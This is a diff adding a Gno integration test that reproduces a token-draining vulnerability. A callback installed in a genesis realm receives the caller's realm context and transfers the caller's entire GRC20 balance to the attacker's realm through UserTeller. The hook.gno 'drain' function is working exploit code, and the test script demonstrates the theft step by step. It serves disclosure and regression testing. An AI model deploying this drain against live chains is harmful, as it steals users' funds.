@@ -1,0 +1,115 @@
+# A public UserTeller turns every stored-callback realm already in examples/
+# into a token drain. gno.land/r/tests/vm/crossrealm lets anyone install
+# Closure3 and hands it the realm's own live cur from the zero-argument
+# ExecuteClosure3, so the callback resolves the calling EOA as the actor.
+# Measured at 16f54a89c: mallory installs the closure once, alice calls
+# ExecuteClosure3 with no arguments, and her 1000000 CBT ends at mallory's realm.
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_userteller_genesis_callback.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_userteller_genesis_callback' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_userteller_genesis_callback.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/demo/defi/grc20reg
+loadpkg gno.land/r/tests/vm/crossrealm
+loadpkg gno.land/r/test/cbtok $WORK/cbtok
+loadpkg gno.land/r/test/hook $WORK/hook
+
+adduser alice
+adduser mallory
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+gnokey maketx send -send 50000000ugnot -to $mallory_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+gnokey maketx call -pkgpath gno.land/r/test/cbtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/cbtok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+# mallory installs her closure on a realm that ships in examples/.
+gnokey maketx call -pkgpath gno.land/r/test/hook -func Install -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test mallory
+stdout OK
+
+# alice signs one MsgCall on that realm: func ExecuteClosure3, no arguments.
+gnokey maketx call -pkgpath gno.land/r/tests/vm/crossrealm -func ExecuteClosure3 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/cbtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'         # IS:     a callback planted in a genesis realm spends the caller's balance
+# stdout '1000000 int64' # SHOULD: a realm's own frame carries no authority over the account that called it
+gnokey query vm/qeval --data "gno.land/r/test/hook.Take()"
+stdout '1000000 int64'
+
+-- cbtok/gnomod.toml --
+module = "gno.land/r/test/cbtok"
+gno = "0.9"
+
+-- cbtok/cbtok.gno --
+package cbtok
+
+import (
+	"gno.land/p/demo/tokens/grc20"
+	"gno.land/r/demo/defi/grc20reg"
+)
+
+var (
+	token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+func init(cur realm) {
+	token, adm = grc20.NewToken("CallbackTok", "CBT", 4, 0, cur)
+	grc20reg.Register(cross(cur), token, "")
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }
+
+-- hook/gnomod.toml --
+module = "gno.land/r/test/hook"
+gno = "0.9"
+
+-- hook/hook.gno --
+package hook
+
+import (
+	"chain"
+
+	"gno.land/r/demo/defi/grc20reg"
+	"gno.land/r/tests/vm/crossrealm"
+)
+
+const key = "gno.land/r/test/cbtok.CBT"
+
+// drain is handed crossrealm's own live cur by ExecuteClosure3, so
+// rlm.Previous() is the EOA that called ExecuteClosure3.
+func drain(_ int, rlm realm) {
+	tok := grc20reg.MustGet(key)
+	victim := rlm.Previous().Address()
+	bal := tok.BalanceOf(victim)
+	if bal == 0 {
+		return
+	}
+	if err := tok.UserTeller().Transfer(0, rlm, chain.PackageAddress("gno.land/r/test/hook"), bal); err != nil {
+		panic(err)
+	}
+}
+
+func Install(cur realm) {
+	crossrealm.SetClosure3(cross(cur), drain)
+}
+
+func Take() int64 {
+	return grc20reg.MustGet(key).BalanceOf(chain.PackageAddress("gno.land/r/test/hook"))
+}
